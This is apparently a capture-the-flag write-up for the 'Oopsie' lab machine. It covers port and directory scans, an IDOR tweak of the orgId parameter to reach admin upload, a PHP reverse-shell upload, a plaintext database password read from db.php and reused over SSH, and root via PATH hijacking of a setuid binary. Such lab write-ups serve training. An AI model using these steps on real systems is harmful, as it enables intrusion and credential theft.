`sudo nmap -vvv -Pn -sCV --reason -p0-65535  -T4 10.129.95.191`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxctowbmnTyFHK0XREQShvlp32DNZ7TS9fp1pTxwt4urebfFSitu4cF2dgTlCyVI6o+bxVLuWvhbKqUNpl/9BCv/1DFEDmbbygvwwcONVx5BtcpO/4ubylZXmzWkC6neyGaQjmzVJFMeRTTUsNkcMgpkTJXSpcuNZTknnQu/SSUC5ZUNPdzgNkHcobGhHNoaJC2StrcFwvcg2ftx6b+wEap6jWbLId8UfJk0OFCHZWZI/SubDzjx3030ZCacC1Sb61/p4Cz9MvLL5qPYcEm8A14uU9pTUfDvhin1KAEEDCSCS3bnvtlw1V7SyF/tqtzPNsmdqG2wKXUb6PLyllU/L
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaHbfbieD7gNSibdzPXBW7/NO05J48DoR4Riz65jUkMsMhI+m3mHjowOPQISgaB8VmT/kUggapZt/iksoOn2Ig=
|   256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLh0LONi0YmlZbqc960WnEcjI1XJTP8Li2KiUt5pmkk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.92 seconds
           Raw packets sent: 66201 (2.913MB) | Rcvd: 66213 (2.754MB)
```


```
┌──(kali㉿kali)-[~/Oopsie]           
└─$ sudo gobuster dir -u http://10.129.95.191/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php                                
===============================================================
Gobuster v3.6                                                  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191/
[+] Method:                  GET     
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404                                   
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s                                                                                                                             
===============================================================                                                                                              
Starting gobuster in directory enumeration mode                   
===============================================================                                                                                              
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
/index.php            (Status: 200) [Size: 10932]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.191/fonts/]
/server-status        (Status: 403) [Size: 278]
/cdn-cgi              (Status: 301) [Size: 316] [--> http://10.129.95.191/cdn-cgi/]

```

```
sudo gobuster dir -u http://10.129.95.191/cdn-cgi/ -w 

/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191/cdn-cgi/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 322] [--> http://10.129.95.191/cdn-cgi/login/]
```


We also could have found cdn-cgi/login via burps built in webcrawler. From this page we inspect the sites cookies to see we have a cookie called user and role. By navigating to our client page we see it is vulnerable to IDOR. changing `http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=2` to `http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=1` gives us the admin id we can change to get access to the upload functionality
![[Pasted image 20260116130310.png]]


from here we can upload the php shell built into kali `/usr/share/webshells/php/php-reverse-shell.php`

![[Pasted image 20260116130328.png]]


From here we have a shell as the www-data user and enumerate more info about the website until we find db.php which contains the creds for the robert user


```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php                        
cat db.php                                                                     
<?php                                                                          
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');         
?> 
```

ssh robert@10.129.95.191

```
robert@oopsie:~$ whoami
robert
robert@oopsie:~$ pwd
/home/robert
robert@oopsie:~$ ls
user.txt
robert@oopsie:~$ cat user.txt 
f2c74ee8db7983851ab2a96a44eb7981
robert@oopsie:~$ 
robert@oopsie:~$ 

```

to find the groups robert is in we user `id -Gn` we see he is in the group `bugtracker` we use the util `find` to see what this group can do 

```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```



From here it is a simple enumeration of this script and what binaries it uses 

`ls -la /usr/bin/bugtracker` shows us that the file runs as root. When we run the script we see that it uses the cat binary.  Therefore we can export our own ENV variables to get our own cat script to run first `Export Path=/home/robert:$PATH` this command will export our current directory into the path variables. We can confirm using `Echo $PATH` Now we just add `/bin/bash` to our cat binary and get a shell as root. 